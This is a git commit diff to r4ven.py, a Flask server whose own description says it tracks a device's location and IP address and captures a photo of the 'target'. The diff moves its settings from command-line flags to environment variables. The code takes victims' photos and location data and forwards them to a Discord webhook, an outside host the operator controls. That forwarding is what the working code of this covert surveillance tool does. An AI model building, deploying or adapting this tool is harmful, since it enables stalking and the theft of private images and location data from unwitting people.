ea2480f8e9194b86ce66502359fa06eebfc46098
Preston Zen <36439263+prestonzen@users.noreply.github.com>
2024-02-25 23:25:43 +0700

    Removed Interactions
    Everything is done via an environment variable now

--- r4ven.py
+++ r4ven.py
@@ -1,24 +1,20 @@
 #!/usr/bin/env python3
 import os
-import sys
-from flask import Flask, request, jsonify, Response
+from flask import Flask, request, Response
 from utils import get_file_data, update_webhook
 import time
 import requests
-import argparse
 
-parser = argparse.ArgumentParser(description="R4VEN - Track device location, IP address, and capture a photo with device details.")
-parser.add_argument("-t", "--target", help="the target url to send the captured images to", default="http://localhost:8000/image")
-parser.add_argument("-p", "--port", help="port to listen on", default=8000, type=int)
-parser.add_argument("-w", "--webhook", help="Discord webhook URL", required=True)
-args = parser.parse_args()
+# Using environment variables with defaults if not set
+TARGET_URL = os.getenv('TARGET_URL', 'http://localhost:8000/image')
+PORT = int(os.getenv('PORT', '8000'))
+DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
 
 if not os.path.exists('image'):
     print(f"Creating image directory at {os.getcwd()}/image")
     os.mkdir('image')
 PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')
 
-DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
 HTML_FILE_NAME = "index.html"
 app = Flask(__name__)
 
@@ -33,28 +29,25 @@ def get_website():
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    update_webhook(args.webhook, data)
+    update_webhook(DISCORD_WEBHOOK_URL, data)
     return "OK"
 
 @app.route('/image', methods=['POST'])
 def image():
     img_file = request.files['image']
     filename = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    img_file.save('%s/%s' % (PATH_TO_IMAGES_DIR, filename))
+    img_file.save(os.path.join(PATH_TO_IMAGES_DIR, filename))
     print(f"Picture of the target captured and saved as {filename}")
 
     # Send the image to the Discord webhook
-    files = {'image': open(f'{PATH_TO_IMAGES_DIR}/{filename}', 'rb')}
-    requests.post(args.webhook, files=files)
-    return Response(f"{filename} saved and sent to Discord webhook")
-
-@app.route('/get_target', methods=['GET'])
-def get_url():
-    return args.target
+    if DISCORD_WEBHOOK_URL:
+        files = {'image': open(os.path.join(PATH_TO_IMAGES_DIR, filename), 'rb')}
+        requests.post(DISCORD_WEBHOOK_URL, files=files)
+    return Response(f"{filename} saved and potentially sent to Discord webhook")
 
 def main():
-    print(f"Server running on port {args.port}")
-    app.run(debug=False, host="0.0.0.0", port=args.port)
+    print(f"Server running on port {PORT}")
+    app.run(debug=False, host="0.0.0.0", port=PORT)
 
 if __name__ == "__main__":
     main()
